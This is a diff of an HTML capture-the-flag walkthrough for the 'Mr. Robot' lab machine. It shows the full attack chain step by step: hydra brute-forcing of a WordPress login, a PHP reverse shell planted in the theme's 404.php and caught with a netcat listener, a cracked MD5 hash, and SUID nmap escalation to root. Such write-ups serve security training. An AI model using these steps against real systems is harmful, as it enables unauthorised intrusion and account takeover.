@@ -2,18 +2,24 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Mr. Robot Walkthrough</title>
-  <link rel="stylesheet" href="../css/styles.css" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Mr. Robot CTF Walkthrough - Axoryn</title>
+  <link rel="stylesheet" href="../css/style.css" />
 </head>
 <body>
-  <div class="container">
-    <h1>Mr. Robot Walkthrough</h1>
-    <p><em>by axoryn</em></p>
-
-    <h2>NMAP</h2>
-    <pre><code>
-PORT    STATE  SERVICE  VERSION
+  <header>
+    <h1>Mr. Robot CTF Walkthrough</h1>
+    <nav>
+      <ul>
+        <li><a href="../index.html">Home</a></li>
+      </ul>
+    </nav>
+  </header>
+  <main>
+    <section class="writeup-card">
+      <h2>Nmap Scan Results</h2>
+      <p>Let’s start by scanning open ports on the target machine. Here’s what <code>nmap</code> revealed:</p>
+      <pre><code>PORT    STATE  SERVICE  VERSION
 22/tcp  closed ssh
 80/tcp  open   http     Apache httpd
 |_http-server-header: Apache
@@ -25,105 +31,142 @@ PORT    STATE  SERVICE  VERSION
 | Not valid before: 2015-09-16T10:45:03
 |_Not valid after:  2025-09-13T10:45:03
 MAC Address: 02:6E:76:1C:2E:07 (Unknown)
-    </code></pre>
+</code></pre>
+      <p>Ports 80 and 443 are open running Apache, but neither site has a proper title or header. The SSH port is closed.</p>
+    </section>
 
-    <h2>Enumerating HTTP and HTTPS</h2>
-    <p>Interacting with these services doesn't yield much information.</p>
-    <!-- img src="../assets/mrrobot/robots.txt.png" alt="robots.txt contents" -->
-
-    <p>Checking out <code>robots.txt</code> reveals:</p>
-    <pre><code>
-User-agent: *
+    <section class="writeup-card">
+      <h2>Enumerating HTTP and HTTPS</h2>
+      <p>Interacting with the HTTP and HTTPS services didn't immediately reveal much. Here's a look at <code>robots.txt</code> which caught my attention:</p>
+      <pre><code>User-agent: *
 fsocity.dic
 key-1-of-3.txt
-    </code></pre>
+</code></pre>
+      <p>Looks like we found the first key file <code>key-1-of-3.txt</code> and a wordlist named <code>fsocity.dic</code>.</p>
 
-    <p>We found the first key and a wordlist. Let's download it:</p>
-    <pre><code>
-wget http://10.10.99.69/fsocity.dic
-    </code></pre>
+      <p>Downloading the wordlist with wget:</p>
+      <pre><code>wget http://10.10.99.69/fsocity.dic
+</code></pre>
 
-    <p>After inspecting the file, we notice many duplicate entries. Let's remove them:</p>
-    <pre><code>
-sort fsocity.dic | uniq -d > clean-dic.txt
-    </code></pre>
+      <p>The file contains tons of duplicate words:</p>
+      <pre><code>angela
+angela
+angela
+...
+</code></pre>
 
-    <p>Using Gobuster, we discover this is a WordPress site:</p>
-    <pre><code>
-/wp-content           (Status: 301)
+      <p>So I cleaned it up by removing duplicates:</p>
+      <pre><code>sort fsocity.dic | uniq -d &gt; clean-dic.txt
+</code></pre>
+
+      <p>Running <code>gobuster</code> on the site revealed it’s running Wordpress:</p>
+      <pre><code>/wp-content           (Status: 301)
 /admin                (Status: 301)
 /audio                (Status: 301)
 /intro                (Status: 200)
-    </code></pre>
+</code></pre>
 
-    <p>Accessing <code>/wp-login.php</code>, we find a login page.</p>
-    <!-- img src="../assets/mrrobot/wp-login.png" alt="WordPress login page" -->
+      <p>Accessing <code>/wp-login.php</code> gave me a login page where username enumeration was possible.</p>
 
-    <p>Testing some usernames, we find that 'elliot' is valid.</p>
-    <!-- img src="../assets/mrrobot/valid-username.png" alt="Valid username found" -->
+      <!-- Image placeholder -->
+      <p><em>Here, I tested some usernames and found "elliot" is valid.</em></p>
+      <img src="../images/wp-login-username-enum.png" alt="Username enumeration on login page" />
 
-    <p>Using our cleaned wordlist, we brute-force the login:</p>
-    <pre><code>
-hydra -L clean-dic.txt -p test <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
-    </code></pre>
+      <!-- Image placeholder -->
+      <p><em>Confirmed 'elliot' is a valid username.</em></p>
+      <img src="../images/elliot-valid-user.png" alt="Valid username elliot found" />
 
-    <p>Hydra finds valid credentials: <code>elliot:XXXXXXX</code></p>
+      <p>Next, I brute forced the login using <code>hydra</code> with the cleaned dictionary and password 'test':</p>
+      <pre><code>hydra -L clean-dic.txt -p test 10.10.99.69 http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=Invalid username"
+</code></pre>
 
-    <p>After logging in, we can edit themes:</p>
-    <!-- img src="../assets/mrrobot/theme-editor.png" alt="WordPress theme editor" -->
+      <p>Hydra found a valid password for <code>elliot</code>!</p>
+      <pre><code>elliot:XXXXXXX
+</code></pre>
 
-    <p>We edit the '404.php' template with a reverse shell from <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey</a>, updating it with our IP and port.</p>
-    <!-- img src="../assets/mrrobot/reverse-shell.png" alt="Injected reverse shell" -->
+      <p>Logging in gave me access to a theme editor form.</p>
 
-    <p>Start a listener on your machine:</p>
-    <pre><code>
-nc -lvnp 1337
-    </code></pre>
+      <!-- Image placeholder -->
+      <p><em>Here is the theme editor where I can modify theme files.</em></p>
+      <img src="../images/theme-editor.png" alt="Wordpress theme editor" />
 
-    <p>We get a shell as 'daemon':</p>
-    <pre><code>
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
-/bin/sh: 0: can't access tty; job control turned off
-    </code></pre>
+      <p>I edited the 404.php template with a PHP reverse shell (from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener noreferrer">pentestmonkey’s repo</a>), adding my IP and port.</p>
 
-    <h2>Privilege Escalation</h2>
-    <p>In the 'robot' user's home directory, we find two files:</p>
-    <pre><code>
--r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
+      <!-- Image placeholder -->
+      <p><em>After updating the 404.php with the reverse shell code.</em></p>
+      <img src="../images/reverse-shell-injected.png" alt="Injected reverse shell into 404.php" />
+
+      <p>Remember to start your listener:</p>
+      <pre><code>nc -lvnp 1337
+</code></pre>
+
+      <p>Visiting a non-existent page triggers the reverse shell, and I got a shell as user <code>daemon</code>:</p>
+      <pre><code>nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.4.7.139] from (UNKNOWN) [10.10.99.69] 39735
+$ whoami
+daemon
+</code></pre>
+    </section>
+
+    <section class="writeup-card">
+      <h2>Privilege Escalation</h2>
+      <p>Looking inside <code>/home/robot</code> I found two files:</p>
+      <pre><code>-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
 -rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
-    </code></pre>
+</code></pre>
 
-    <p>We can't read the second key, but we can read the password hash:</p>
-    <pre><code>
-robot:c3fcd3d76192e4007dfb496cca67e13b
-    </code></pre>
+      <p>I couldn't read the second key, but I could read the password hash:</p>
+      <pre><code>robot:c3fcd3d76192e4007dfb496cca67e13b
+</code></pre>
 
-    <p>Using <a href="https://crackstation.net/">CrackStation</a>, we crack the hash.</p>
-    <!-- img src="../assets/mrrobot/cracked-hash.png" alt="Cracked password hash" -->
+      <p>I took the hash to <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">CrackStation</a> and got the password!</p>
 
-    <p>We now have the password for 'robot'. To switch users, we need a stable shell:</p>
-    <pre><code>
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-    </code></pre>
+      <!-- Image placeholder -->
+      <p><em>Screenshot of cracked password on CrackStation.</em></p>
+      <img src="../images/crackstation-result.png" alt="Password cracked on CrackStation" />
 
-    <h2>Root.txt</h2>
-    <p>After some enumeration, we check for SUID binaries:</p>
-    <pre><code>
-find / -perm -u=s -type f 2>/dev/null
-    </code></pre>
+      <p>Trying to switch user with <code>su robot</code> initially failed because the shell was unstable:</p>
+      <pre><code>su: must be run from a terminal
+</code></pre>
 
-    <p>We find that 'nmap' has the SUID bit set. According to GTFOBins, it's exploitable.</p>
-    <!-- img src="../assets/mrrobot/gtfobins-nmap.png" alt="GTFOBins nmap exploit" -->
+      <p>I stabilized the shell with:</p>
+      <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre>
 
-    <p>We exploit it:</p>
-    <pre><code>
-nmap --interactive
-nmap> !sh
+      <p>After that, I could switch to the <code>robot</code> user successfully.</p>
+    </section>
+
+    <section class="writeup-card">
+      <h2>Getting Root</h2>
+      <p>After more enumeration, I didn’t find much at first. Then I checked for SUID binaries:</p>
+      <pre><code>find / -perm -u=s -type f 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+...
+/usr/local/bin/nmap
+...
+</code></pre>
+
+      <p>If you’ve done Boot2Root challenges, you know <code>nmap</code> with SUID is suspicious. Checking <a href="https://gtfobins.github.io/gtfobins/nmap/" target="_blank" rel="noopener noreferrer">GTFOBins</a> confirmed it’s exploitable.</p>
+
+      <!-- Image placeholder -->
+      <p><em>GTFOBins nmap exploit snippet.</em></p>
+      <img src="../images/gtfobins-nmap.png" alt="GTFOBins nmap SUID exploit" />
+
+      <p>Exploiting the SUID <code>nmap</code> binary to spawn a root shell:</p>
+      <pre><code>nmap --interactive
+nmap&gt; !sh
 # whoami
 root
-    </code></pre>
+</code></pre>
 
-    <p>Now, we can read the third key in <code>/root</code>.</p>
-  </div>
+      <p>And just like that, root access was ours. The final key was in <code>/root</code>.</p>
+    </section>
+  </main>
+  <footer>
+    <p>&copy; 2025 Axoryn. All rights reserved.</p>
+  </footer>
 </body>
 </html>
